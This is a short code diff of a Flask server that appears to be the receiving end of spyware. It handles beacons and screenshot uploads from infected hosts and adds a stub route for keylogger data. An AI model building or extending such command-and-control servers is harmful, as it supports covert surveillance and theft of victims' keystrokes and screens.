@@ -38,7 +38,8 @@ def beacon_handler():
 @app.route("/screen/<host>/", methods=['POST'])
 def screenshot_handler(host):
     """
-    handle screenshot uploads
+    Handler for screenshot uploads
+    :param host: ip of reporter
     :return:  "invalid" if failed, "success" if successful
     """
     # set upload folder to hostname
@@ -60,3 +61,14 @@ def screenshot_handler(host):
 
     except:
         return "invalid"
+
+
+@app.route("/key/<host>")
+@app.route("/key/<host>/")
+def keylog_handler(host):
+    """
+    Handler for keylogger data, line by line
+    :param host: ip of reporter
+    :return:
+    """
+    return "failed"
